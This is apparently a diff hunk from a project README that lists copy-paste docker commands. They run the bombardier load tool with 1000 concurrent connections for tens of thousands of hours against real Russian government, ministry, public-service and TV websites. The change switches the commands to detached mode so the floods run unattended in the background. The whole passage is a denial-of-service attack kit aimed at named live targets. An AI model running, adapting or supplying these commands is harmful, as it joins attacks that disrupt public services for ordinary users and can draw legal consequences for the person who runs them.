@@ -7,21 +7,21 @@ From local PC `./run_all_docker.sh`
 <br>
 or easiest way 
 
-`docker run -ti --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru`
+`docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru`
 <br>
-`docker run -ti --rm alpine/bombardier -c 1000 -d 600000h -l https://mil.ru`
+`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://mil.ru`
 <br>
-`docker run -ti --rm alpine/bombardier -c 1000 -d 600000h -l http://www.scrf.gov.ru`
+`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l http://www.scrf.gov.ru`
 <br>
-`docker run -ti --rm alpine/bombardier -c 1000 -d 600000h -l https://ach.gov.ru`
+`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://ach.gov.ru`
 <br>
-`docker run -ti --rm alpine/bombardier -c 1000 -d 600000h -l https://epp.genproc.gov.ru`
+`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://epp.genproc.gov.ru`
 <br>
-`docker run -ti --rm alpine/bombardier -c 1000 -d 600000h -l https://www.gosuslugi.ru`
+`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://www.gosuslugi.ru`
 <br>
-`docker run -ti --rm alpine/bombardier -c 1000 -d 600000h -l https://www.1tv.ru`
+`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://www.1tv.ru`
 <br>
-`docker run -ti --rm alpine/bombardier -c 1000 -d 600000h -l https://mid.ru`
+`docker run -d --rm alpine/bombardier -c 1000 -d 600000h -l https://mid.ru`
 <br>
 sites
 https://mil.ru
